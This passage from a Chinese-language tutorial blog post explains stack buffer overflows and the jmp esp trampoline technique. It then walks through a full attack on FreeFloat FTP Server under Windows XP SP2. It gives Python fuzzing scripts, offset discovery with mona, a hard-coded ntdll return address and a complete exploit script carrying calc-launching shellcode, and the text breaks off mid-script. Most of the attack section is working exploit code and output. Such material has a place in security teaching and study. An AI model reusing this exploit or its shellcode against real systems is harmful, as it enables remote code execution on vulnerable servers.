+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">fun</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span> *data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> buffer[BUF_LEN];</span><br><span class="line">    <span class="built_in">strcpy</span>((<span class="keyword">char</span>*)buffer,(<span class="keyword">char</span>*)data);<span class="comment">//溢出点</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这个函数没有做什么有“意义”的事情（这里主要是为了简化问题），但是它是一个典型的栈溢出代码。在使用不安全的 strcpy 库函数时，系统会盲目地将 data 的全部数据拷贝到 buffer 指向的内存区域。buffer 的长度是有限的，一旦 data 的数据长度超过 BUF_LEN，便会产生缓冲区溢出。</p>
+<p><img src="/images/security/hack/buffer-overflow-attack/缓冲区溢出.jpg" alt>图 3：缓冲区溢出  </p>
+<p>由于栈是低地址方向增长的，因此局部数组buffer的指针在缓冲区的下方。当把 data 的数据拷贝到 buffer 内时，超过缓冲区区域的高地址部分数据会“淹没”原本的其他栈帧数据，根据淹没数据的内容不同，可能会有产生以下情况：<br>1、淹没了其他的局部变量。如果被淹没的局部变量是条件变量，那么可能会改变函数原本的执行流程。这种方式可以用于破解简单的软件验证。<br>2、淹没了 ebp 的值。修改了函数执行结束后要恢复的栈指针，将会导致栈帧失去平衡。<br>3、淹没了返回地址。这是栈溢出原理的核心所在，通过淹没的方式修改函数的返回地址，使程序代码执行“意外”的流程！<br>4、淹没参数变量。修改函数的参数变量也可能改变当前函数的执行结果和流程。<br>5、淹没上级函数的栈帧，情况与上述 4 点类似，只不过影响的是上级函数的执行。当然这里的前提是保证函数能正常返回，即函数地址不能被随意修改（这可能很麻烦！）。<br>如果在 data 本身的数据内就保存了一系列的指令的二进制代码，一旦栈溢出修改了函数的返回地址，并将该地址指向这段二进制代码的其实位置，那么就完成了基本的溢出攻击行为。  </p>
+<p><img src="/images/security/hack/buffer-overflow-attack/基本栈溢出攻击.jpg" alt>图 4：基本栈溢出攻击  </p>
+<p>通过计算返回地址内存区域相对于 buffer 的偏移，并在对应位置构造新的地址指向 buffer 内部二进制代码的其实位置，便能执行用户的自定义代码！这段既是代码又是数据的二进制数据被称为 shellcode，因为攻击者希望通过这段代码打开系统的 shell，以执行任意的操作系统命令——比如下载病毒，安装木马，开放端口，格式化磁盘等恶意操作。</p>
+<h2 id="四、栈溢出攻击"><a href="#四、栈溢出攻击" class="headerlink" title="四、栈溢出攻击"></a><strong>四、栈溢出攻击</strong></h2><p>上述过程虽然理论上能完成栈溢出攻击行为，但是实际上很难实现。操作系统每次加载可执行文件到进程空间的位置都是无法预测的，因此栈的位置实际是不固定的，通过硬编码覆盖新返回地址的方式并不可靠。为了能准确定位 shellcode 的地址，需要借助一些额外的操作，其中最经典的是借助跳板的栈溢出方式。</p>
+<p>根据前边所述，函数执行后，栈指针 esp 会恢复到压入参数时的状态，在图 4 中即 data 参数的地址。如果我们在函数的返回地址填入一个地址，该地址指向的内存保存了一条特殊的指令 <code>jmp esp</code> ——跳板。那么函数返回后，会执行该指令并跳转到 esp 所在的位置——即 data 的位置。我们可以将缓冲区再多溢出一部分，淹没 data 这样的函数参数，并在这里放上我们想要执行的代码！这样，不管程序被加载到哪个位置，最终都会回来执行栈内的代码。</p>
+<p><img src="/images/security/hack/buffer-overflow-attack/借助跳板的栈溢出攻击.jpg" alt>图 5：借助跳板的栈溢出攻击  </p>
+<p>借助于跳板的确可以很好的解决栈帧移位（栈加载地址不固定）的问题，但是跳板指令从哪找呢？“幸运”的是，<code>在 Windows 操作系统加载的大量 dll 中，包含了许多这样的指令</code>，比如 kernel32.dll，ntdll.dll，这两个动态链接库是 Windows 程序默认加载的。如果是图形化界面的 Windows 程序还会加载 user32.dll，它也包含了大量的跳板指令！而且更“神奇”的是<code>Windows操作系统加载 dll 时候一般都是固定地址，因此这些 dll 内的跳板指令的地址一般都是固定的</code>。我们可以离线搜索出跳板执行在 dll 内的偏移，并加上 dll 的加载地址，便得到一个适用的跳板指令地址！</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 查询dll内第一个jmp esp指令的位置</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">findJmp</span><span class="params">(<span class="keyword">char</span>*dll_name)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span>* handle=(<span class="keyword">char</span>*)LoadLibraryA(dll_name);<span class="comment">// 获取dll加载地址</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> pos=<span class="number">0</span>;;pos++)<span class="comment">// 遍历dll代码空间</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(handle[pos]==(<span class="keyword">char</span>)<span class="number">0xff</span>&amp;&amp;handle[pos+<span class="number">1</span>]==(<span class="keyword">char</span>)<span class="number">0xe4</span>)<span class="comment">//寻找0xffe4 = jmp  esp</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> (<span class="keyword">int</span>)(handle+pos);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这里简化了搜索算法，输出第一个跳板指令的地址，读者可以选取其他更合适位置。LoadLibraryA 库函数返回值就是 dll 的加载地址，然后加上搜索到的跳板指令偏移 pos 便是最终地址。jmp esp 指令的二进制表示为 0xffe4，因此搜索算法就是搜索 dll 内这样的字节数据即可。</p>
+<p>虽然如此，上述的攻击方式还不够好。因为在 esp 后继续追加 shellcode 代码会将上级函数的栈帧淹没，这样做并没有什么好处，甚至可能会带来运行时问题。既然被溢出的函数栈帧内提供了缓冲区，我们还是把核心的 shellcode 放在缓冲区内，而在 esp 之后放上跳转指令转移到原本的缓冲区位置。<code>由于这样做使代码的位置在 esp 指针之前，如果 shellcode 中使用了 push 指令便会让 esp 指令与 shellcode 代码越来越近，甚至淹没自身的代码。这显然不是我们想要的结果，因此我们可以强制抬高 esp 指针，使它在 shellcode 之前（低地址位置），这样就能在 shellcode 内正常使用 push 指令了。</code></p>
+<p><img src="/images/security/hack/buffer-overflow-attack/调整shellcode与栈指针.jpg" alt>图 6：调整 shellcode 与栈指针  </p>
+<p>调整代码的内容很简单：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">add esp,-X</span><br><span class="line">jmp esp</span><br></pre></td></tr></table></figure></p>
+<p>第一条指令抬高了栈指针到 shellcode 之前。X 代表 shellcode 起始地址与 esp 的偏移。如果 shellcode 从缓冲区起始位置开始，那么就是 buffer 的地址偏移。这里不使用 sub esp,X 指令主要是避免 X 的高位字节为 0 的问题，很多情况下缓冲区溢出是针对字符串缓冲区的，如果出现字节 0 会导致缓冲区截断，从而导致溢出失败。</p>
+<p>第二条指令就是跳转到 shellcode 的起始位置继续执行。（又是 jmp esp！）<br>通过上述方式便能获得一个较为稳定的栈溢出攻击。</p>
+<h1 id="缓冲区攻击实战"><a href="#缓冲区攻击实战" class="headerlink" title="缓冲区攻击实战"></a><strong>缓冲区攻击实战</strong></h1><h2 id="环境说明"><a href="#环境说明" class="headerlink" title="环境说明"></a><strong>环境说明</strong></h2><p>这次选择的攻击环境简要列写如下：  </p>
+<ul>
+<li>攻击对象：<a href="http://pan.baidu.com/s/1c1TddEK" target="_blank" rel="noopener">FreeFloatFTPServer</a></li>
+<li>操作系统：Windows XP SP2</li>
+<li>工具：<a href="https://www.immunityinc.com/products/debugger/index.html" target="_blank" rel="noopener">Immunity Debugger</a>（<a href="https://github.com/kbandla/ImmunityDebugger" target="_blank" rel="noopener">Github</a>）、<a href="https://www.rapid7.com/products/metasploit/download.jsp" target="_blank" rel="noopener">Metasploit Framwork</a>（<a href="https://github.com/rapid7/metasploit-framework" target="_blank" rel="noopener">Github</a>）、<a href="https://github.com/corelan/mona" target="_blank" rel="noopener">mona</a>、<a href="http://pan.baidu.com/s/1i4YY5pz" target="_blank" rel="noopener">Infigo FTPStress</a></li>
+</ul>
+<h2 id="检测-FreeFloatFTPServer-是否存在漏洞"><a href="#检测-FreeFloatFTPServer-是否存在漏洞" class="headerlink" title="检测 FreeFloatFTPServer 是否存在漏洞"></a><strong>检测 FreeFloatFTPServer 是否存在漏洞</strong></h2><h3 id="法一：利用-Infigo-FTPStress-软件"><a href="#法一：利用-Infigo-FTPStress-软件" class="headerlink" title="法一：利用 Infigo FTPStress 软件"></a><strong>法一：利用 Infigo FTPStress 软件</strong></h3><h4 id="Infigo-FTPStress"><a href="#Infigo-FTPStress" class="headerlink" title="Infigo FTPStress"></a><strong>Infigo FTPStress</strong></h4><p><a href="http://pan.baidu.com/s/1i4YY5pz" target="_blank" rel="noopener">Infigo FTPStress</a> 软件可用于检测 FTP 服务器是否存在漏洞。该软件的主界面如下：<br><img src="/images/security/hack/buffer-overflow-attack/ftpfuzz-mainscreen.png" alt><br>接下来点击 <strong>Config</strong> 对该软件进行简单配置：<br> <strong>攻击数据</strong><br><img src="/images/security/hack/buffer-overflow-attack/ftpfuzz-fuzzing-data.png" alt><br> <strong>攻击数据长度</strong>：默认即可<br><img src="/images/security/hack/buffer-overflow-attack/ftpfuzz-fuzzing-sizes.png" alt><br> <strong>攻击选项</strong><br><img src="/images/security/hack/buffer-overflow-attack/ftpfuzz-fuzzing-options.png" alt>  </p>
+<h4 id="攻击-USER-命令"><a href="#攻击-USER-命令" class="headerlink" title="攻击 USER 命令"></a><strong>攻击 USER 命令</strong></h4><p>这次选择攻击的是 USER 命令。结果如下图所示：<br><img src="/images/security/hack/buffer-overflow-attack/ftpfuzz-attack-user.png" alt>  </p>
+<p>红色警示，说明 FreeFloatFTPServer 的 USER 命令存在缓冲溢出漏洞。</p>
+<h4 id="攻击-MKD-命令"><a href="#攻击-MKD-命令" class="headerlink" title="攻击 MKD 命令"></a><strong>攻击 MKD 命令</strong></h4><p><img src="/images/security/hack/buffer-overflow-attack/ftpfuzz-attack-mkd.png" alt>  </p>
+<p>红色警示，说明 FreeFloatFTPServer 的 MKD 命令存在缓冲溢出漏洞。</p>
+<p>下文的攻击针对该软件的 MKD 命令。</p>
+<h3 id="法二：代码检测"><a href="#法二：代码检测" class="headerlink" title="法二：代码检测"></a><strong>法二：代码检测</strong></h3><p>Python 代码样例如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'Detect buffer overflow script'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">send_exploit</span><span class="params">()</span>:</span></span><br><span class="line">	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">	connect = s.connect((<span class="string">'127.0.0.1'</span>, <span class="number">21</span>))</span><br><span class="line">	<span class="keyword">print</span> s.recv(<span class="number">1024</span>)</span><br><span class="line"></span><br><span class="line">	s.send(<span class="string">'USER anonymous\r\n'</span>)</span><br><span class="line">	<span class="keyword">print</span> s.recv(<span class="number">1024</span>)</span><br><span class="line"></span><br><span class="line">	s.send(<span class="string">'PASS anonymous\r\n'</span>)</span><br><span class="line">	<span class="keyword">print</span> s.recv(<span class="number">1024</span>)</span><br><span class="line"></span><br><span class="line">	exploit = <span class="string">'A'</span> * <span class="number">100</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">try</span>:</span><br><span class="line">		<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1000</span>):</span><br><span class="line">			exploit = exploit + <span class="string">'A'</span></span><br><span class="line">			s.send(<span class="string">'MKD'</span> + exploit + <span class="string">'\r\n'</span>)</span><br><span class="line">			<span class="comment"># print s.recv(1024)</span></span><br><span class="line">			<span class="keyword">print</span> <span class="string">'Pass test'</span></span><br><span class="line">			<span class="keyword">print</span> <span class="string">'Length of exploit is %d'</span> % len(exploit)</span><br><span class="line">	<span class="keyword">except</span>:</span><br><span class="line">		<span class="keyword">print</span> <span class="string">'[*]Server is down'</span></span><br><span class="line">		<span class="keyword">print</span> <span class="string">'Length of exploit is %d'</span> % len(exploit)</span><br><span class="line">	</span><br><span class="line">	s.send(<span class="string">'QUIT\r\n'</span>)</span><br><span class="line">	s.close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">	send_exploit()</span><br></pre></td></tr></table></figure></p>
+<p>检测结果如下：　　<br><img src="/images/security/hack/buffer-overflow-attack/buffer-overflow-detect-by-code.png" alt>  </p>
+<h2 id="确定函数返回地址的存放位置"><a href="#确定函数返回地址的存放位置" class="headerlink" title="确定函数返回地址的存放位置"></a><strong>确定函数返回地址的存放位置</strong></h2><p>从之前的介绍中，我们知道，要成功实现缓冲溢出攻击，一个很重要的环节就是确定函数返回地址存放位置，以便我们在该位置存放指向 ShellCode 的地址值。</p>
+<h3 id="确定攻击载体大概长度"><a href="#确定攻击载体大概长度" class="headerlink" title="确定攻击载体大概长度"></a><strong>确定攻击载体大概长度</strong></h3><p>从之前的实验来看，攻击载体 exploit 的长度不到 1000 个字符就可以让 FreeFloatFTPServer 停止工作。在这里把 1000 个字符长作为 exploit 的长度。</p>
+<p>首先，我们在 Immunity Debugger 中打开 FreeFloatFTPServer EXE 程序，并运行该程序，如下图所示：<br><img src="/images/security/hack/buffer-overflow-attack/immunity-debugger-mainscreen.png" alt>  </p>
+<p>接下来，执行攻击程序：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'Exploit script'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">send_exploit</span><span class="params">()</span>:</span></span><br><span class="line">    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    connect = s.connect((<span class="string">'127.0.0.1'</span>, <span class="number">21</span>))</span><br><span class="line">    <span class="keyword">print</span> s.recv(<span class="number">1024</span>)</span><br><span class="line"></span><br><span class="line">    s.send(<span class="string">'USER anonymous\r\n'</span>)</span><br><span class="line">    <span class="keyword">print</span> s.recv(<span class="number">1024</span>)</span><br><span class="line"></span><br><span class="line">    s.send(<span class="string">'PASS anonymous\r\n'</span>)</span><br><span class="line">    <span class="keyword">print</span> s.recv(<span class="number">1024</span>)</span><br><span class="line"></span><br><span class="line">    exploit = <span class="string">'A'</span> * <span class="number">1000</span></span><br><span class="line">    s.send(<span class="string">'MKD'</span> + exploit + <span class="string">'\r\n'</span>)</span><br><span class="line">    <span class="keyword">print</span> s.recv(<span class="number">1024</span>)</span><br><span class="line"></span><br><span class="line">    s.send(<span class="string">'QUIT\r\n'</span>)</span><br><span class="line">    s.close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    send_exploit()</span><br></pre></td></tr></table></figure></p>
+<p>最后，会看到如下结果：<br><img src="/images/security/hack/buffer-overflow-attack/general-length-of-exploit.png" alt>  </p>
+<h3 id="确定函数返回地址的存放位置-1"><a href="#确定函数返回地址的存放位置-1" class="headerlink" title="确定函数返回地址的存放位置"></a><strong>确定函数返回地址的存放位置</strong></h3><p>对于确定函数返回地址的存放位置，我们有一个很好的工具 <a href="https://github.com/corelan/mona" target="_blank" rel="noopener">mona</a> 可以使用。mona 是 Immunity Debugger 的一个插件，需要我们自己添加到 Immunity Debugger 的 PyCommands 目录下。</p>
+<p><strong>第一</strong>，生成特征字符串：<br><img src="/images/security/hack/buffer-overflow-attack/mona-pattern-create.png" alt><br><strong>注：</strong>也可以用 Metasploit framwork 中的 pattern_create.rb 命令生成，结果一样。对于该框架的环境搭建花费了太多时间，而且最后是通过安装集成了该框架的 Kali Linux 才解决的。建议直接安装 Kali Linux 以便于使用。</p>
+<p><strong>第二</strong>，我们将生成的特征字符串（存放在 …/pattern.txt 文件）替换原 exploit 的内容：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exploit = <span class="string">'特征字符串'</span></span><br></pre></td></tr></table></figure></p>
+<p><strong>第三</strong>，在 Immunity Debugger 中重启 FreeFloatFTPServer，并开启攻击脚本，并得到如下结果：<br><img src="/images/security/hack/buffer-overflow-attack/mona-pattern-attack.png" alt>  </p>
+<p><strong>第四</strong>，执行上图中的 !mona pattern_offset addr 命令，其中 addr 的值是此时 EIP 的值 0x33694132，执行结果说明了函数返回地址所在位置偏移为 248：<br><img src="/images/security/hack/buffer-overflow-attack/mona-pattern-offset.png" alt>  </p>
+<p><strong>最后</strong>，为了确保求出来的偏移位置正确，我们将 exploit 的值修改为：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exploit = <span class="string">'A'</span> * <span class="number">248</span> + <span class="string">'B'</span> * <span class="number">4</span> + <span class="string">'C'</span> * <span class="number">748</span></span><br></pre></td></tr></table></figure></p>
+<p>并进行新一轮的攻击，得到如下结果：<br><img src="/images/security/hack/buffer-overflow-attack/mona-pattern-ensure.png" alt>  </p>
+<h2 id="攻击"><a href="#攻击" class="headerlink" title="攻击"></a><strong>攻击</strong></h2><p>现在的工作就是把真正的攻击代码 ShellCode 放到 exploit 中，不过在此之前我们还要做一些工作。</p>
+<h3 id="查找-jmp-esp-指令"><a href="#查找-jmp-esp-指令" class="headerlink" title="查找 jmp esp 指令"></a><strong>查找 jmp esp 指令</strong></h3><p>因为我们无法在源程序中加入代码，所以我们需要借助于系统文件中所包含的指令。<strong>启动</strong> FreeFloatFTPServer，查找 push esb 指令：<br><img src="/images/security/hack/buffer-overflow-attack/jmp-esp.png" alt>  </p>
+<p>从其中我们选出地址为 0x7c941eed 的在 ntdll.dll 中的 push esp 指令，并重新构造 exploit：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exploit = <span class="string">'A'</span> * <span class="number">248</span> + <span class="string">'\xed\1e\94\x7c'</span> * <span class="number">4</span> + <span class="string">'C'</span> * <span class="number">748</span>	<span class="comment"># 注意 i386 CPU 是小端存储数据的</span></span><br></pre></td></tr></table></figure></p>
+<p>对于验证 ‘\xed\1e\94\x7c’ 是否被正确存放到函数返回地址处，请参考前文。</p>
+<p>另外，我们可以在 FreeFloatFTPServer <strong>启动</strong>后设定断点，看程序是否执行到 jmp esp 指令时停下：<br><img src="/images/security/hack/buffer-overflow-attack/mona-set-breakpoint.png" alt>  </p>
+<h3 id="发起攻击"><a href="#发起攻击" class="headerlink" title="发起攻击"></a><strong>发起攻击</strong></h3><h4 id="利用网络-ShellCode"><a href="#利用网络-ShellCode" class="headerlink" title="利用网络 ShellCode"></a><strong>利用网络 ShellCode</strong></h4><p>在这里，我选者了通过攻击 FreeFloatFTPServer 从而打开系统计算器的 <a href="http://www.fuzzysecurity.com/tutorials/expDev/6.html" target="_blank" rel="noopener">ShellCode</a>。和 exploit 组装在一起的代码如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">shellcode = (</span><br><span class="line">    <span class="string">"\xd9\xec\xd9\x74\x24\xf4\xb8\x28\x1f\x44\xde\x5b\x31\xc9\xb1"</span></span><br><span class="line">    <span class="string">"\x33\x31\x43\x17\x83\xeb\xfc\x03\x6b\x0c\xa6\x2b\x97\xda\xaf"</span></span><br><span class="line">    <span class="string">"\xd4\x67\x1b\xd0\x5d\x82\x2a\xc2\x3a\xc7\x1f\xd2\x49\x85\x93"</span></span><br><span class="line">    <span class="string">"\x99\x1c\x3d\x27\xef\x88\x32\x80\x5a\xef\x7d\x11\x6b\x2f\xd1"</span></span><br><span class="line">    <span class="string">"\xd1\xed\xd3\x2b\x06\xce\xea\xe4\x5b\x0f\x2a\x18\x93\x5d\xe3"</span></span><br><span class="line">    <span class="string">"\x57\x06\x72\x80\x25\x9b\x73\x46\x22\xa3\x0b\xe3\xf4\x50\xa6"</span></span><br><span class="line">    <span class="string">"\xea\x24\xc8\xbd\xa5\xdc\x62\x99\x15\xdd\xa7\xf9\x6a\x94\xcc"</span></span><br><span class="line">    <span class="string">"\xca\x19\x27\x05\x03\xe1\x16\x69\xc8\xdc\x97\x64\x10\x18\x1f"</span></span><br><span class="line">    <span class="string">"\x97\x67\x52\x5c\x2a\x70\xa1\x1f\xf0\xf5\x34\x87\x73\xad\x9c"</span></span><br><span class="line">    <span class="string">"\x36\x57\x28\x56\x34\x1c\x3e\x30\x58\xa3\x93\x4a\x64\x28\x12"</span></span><br><span class="line">    <span class="string">"\x9d\xed\x6a\x31\x39\xb6\x29\x58\x18\x12\x9f\x65\x7a\xfa\x40"</span></span><br><span class="line">    <span class="string">"\xc0\xf0\xe8\x95\x72\x5b\x66\x6b\xf6\xe1\xcf\x6b\x08\xea\x7f"</span></span><br><span class="line">    <span class="string">"\x04\x39\x61\x10\x53\xc6\xa0\x55\xab\x8c\xe9\xff\x24\x49\x78"</span></span><br><span class="line">    <span class="string">"\x42\x29\x6a\x56\x80\x54\xe9\x53\x78\xa3\xf1\x11\x7d\xef\xb5"</span></span><br><span class="line">    <span class="string">"\xca\x0f\x60\x50\xed\xbc\x81\x71\x8e\x23\x12\x19\x7f\xc6\x92"</span></span><br><span class="line">    <span class="string">"\xb8\x7f"</span></span><br><span class="line">)</span><br><span class="line">buffer = <span class="string">'\x90'</span> * <span class="number">20</span> + shellcode		<span class="comment"># \x90 表示 nop （no operation）</span></span><br><span class="line">evil = <span class="string">'A'</span> * <span class="number">248</span> + <span class="string">'\xed\x1e\x94\x7c'</span> + buffer + <span class="string">'C'</span> * (<span class="number">748</span> - len(buffer))	<span class="comment"># 注意 i386 CPU 是小端存储数据的</span></span><br></pre></td></tr></table></figure></p>
+<p>直接双击打开 FreeFloatFTPServer （注意不是在 Immunity Debugger 中打开），执行攻击程序，会出现如下结果：<br><img src="/images/security/hack/buffer-overflow-attack/calc.png" alt><br><strong>这证明了攻击已经成功！！！</strong></p>
+<p>下边完整的攻击程序：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'Exploit script'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">send_exploit</span><span class="params">()</span>:</span></span><br><span class="line">    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    connect = s.connect((<span class="string">'127.0.0.1'</span>, <span class="number">21</span>))</span><br><span class="line">    <span class="keyword">print</span> s.recv(<span class="number">1024</span>)</span><br><span class="line"></span><br><span class="line">    s.send(<span class="string">'USER anonymous\r\n'</span>)</span><br><span class="line">    <span class="keyword">print</span> s.recv(<span class="number">1024</span>)</span><br><span class="line"></span><br><span class="line">    s.send(<span class="string">'PASS anonymous\r\n'</span>)</span><br><span class="line">    <span class="keyword">print</span> s.recv(<span class="number">1024</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># exploit = 'A' * 1000</span></span><br><span class="line">    <span class="comment"># exploit = 'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2B'</span></span><br><span class="line">    <span class="comment"># exploit = 'A' * 248 + 'B' * 4 + 'C' * 748</span></span><br><span class="line">    shellcode = (</span><br><span class="line">        <span class="string">"\xd9\xec\xd9\x74\x24\xf4\xb8\x28\x1f\x44\xde\x5b\x31\xc9\xb1"</span></span><br><span class="line">        <span class="string">"\x33\x31\x43\x17\x83\xeb\xfc\x03\x6b\x0c\xa6\x2b\x97\xda\xaf"</span></span><br><span class="line">        <span class="string">"\xd4\x67\x1b\xd0\x5d\x82\x2a\xc2\x3a\xc7\x1f\xd2\x49\x85\x93"</span></span><br><span class="line">        <span class="string">"\x99\x1c\x3d\x27\xef\x88\x32\x80\x5a\xef\x7d\x11\x6b\x2f\xd1"</span></span><br><span class="line">        <span class="string">"\xd1\xed\xd3\x2b\x06\xce\xea\xe4\x5b\x0f\x2a\x18\x93\x5d\xe3"</span></span><br><span class="line">        <span 